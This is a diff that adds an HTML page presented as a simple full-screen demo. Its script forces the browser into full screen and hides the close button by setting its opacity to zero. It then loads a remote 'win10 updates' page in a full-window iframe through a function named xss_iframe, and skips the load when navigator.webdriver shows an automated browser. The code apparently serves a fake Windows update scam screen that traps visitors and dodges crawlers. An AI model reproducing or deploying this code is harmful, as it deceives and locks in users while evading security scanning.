@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Title</title>
+</head>
+<body>
+
+<div class="demo"><button id="open_full-btn">打开全屏</button>
+    <div id="full_div" style="background:yellow;width:0px;height: 0px;">
+        <button id="close_full-btn" style="opacity: 0;">关闭全屏</button>
+    </div>
+</div>
+
+<script>
+
+    // 打开该id盒子元素的全屏
+    function fullScreen(id) {
+        let el = document.getElementById(id);
+        let rfs = el.requestFullScreen || el.webkitRequestFullScreen || el.mozRequestFullScreen || el.msRequestFullScreen;
+        if(typeof rfs != "undefined" && rfs) {
+            rfs.call(el);
+            return false;
+        }else {
+            if(typeof window.ActiveXObject != "undefined") {
+                let wscript = new ActiveXObject("WScript.Shell");
+                if(wscript) {
+                    wscript.SendKeys("{F11}");
+                    return true;
+                }else {
+                    return false;
+                }
+            }
+        }
+    }
+    // 推出全屏，或按ESC按钮退出全屏
+    function exitFullScreen() {
+        console.log("exit");
+        let el= document;
+        let cfs = el.cancelFullScreen || el.webkitCancelFullScreen || el.mozCancelFullScreen || el.exitFullScreen;
+        if (typeof cfs != "undefined" && cfs) {
+            cfs.call(el);
+            return false;
+        }else {
+            if (typeof window.ActiveXObject != "undefined") {
+                let wscript = new ActiveXObject("WScript.Shell");
+                if (wscript != null) {
+                    wscript.SendKeys("{F11}");
+                    return true;
+                }else {
+                    return false;
+                }
+            }
+        }
+
+    }
+    function xss_iframe(div_id, url, call_func, call_data1, call_data2){ // 加载落地页。示例：页面需要放置锚点：<div class="iframe-div-1"></div>
+        let that = this;
+        let iframe = document.createElement("iframe");
+        let iframe_div = document.getElementById(div_id);
+        iframe_div.innerHTML = "";
+        iframe.setAttribute("width", window.innerWidth);
+        iframe.setAttribute("height", window.innerHeight);
+        iframe.setAttribute("scrolling", "yes");
+        iframe.setAttribute("frameborder", "0");
+        iframe.classList.add("iframe-content");
+        iframe.classList.add("iframe-content-xss");
+        iframe.setAttribute("data-src", url);
+        iframe.setAttribute("src", "javascript:(function(){var fs=parent.document.getElementsByTagName('iframe');var src=fs[0].getAttribute('data-src');if(!navigator.webdriver){fs[0].src=src;fs[0].setAttribute('data-src', 'true');}})()");
+        iframe_div.appendChild(iframe);
+        iframe.onload = function (){
+            // 此处可以放置统计代码或其他
+            try {call_func(call_data1, call_data2);}catch (e){}
+        };
+    }
+    function del_xss_iframe(div_id){
+        let that = this;
+        document.getElementById(div_id).innerHTML="";
+    }
+</script>
+
+<script>
+    (function (){
+        document.getElementById("open_full-btn").onclick = function(){
+            if (fullScreen("full_div")){
+
+            }
+            setTimeout(function (){
+                xss_iframe("full_div", "https://didayu.cn/updates/win10/index.htm");
+            }, 100)
+        };
+        document.getElementById("close_full-btn").onclick = function(){
+            exitFullScreen();
+        }
+
+    })();
+</script>
+
+
+</body>
+</html>
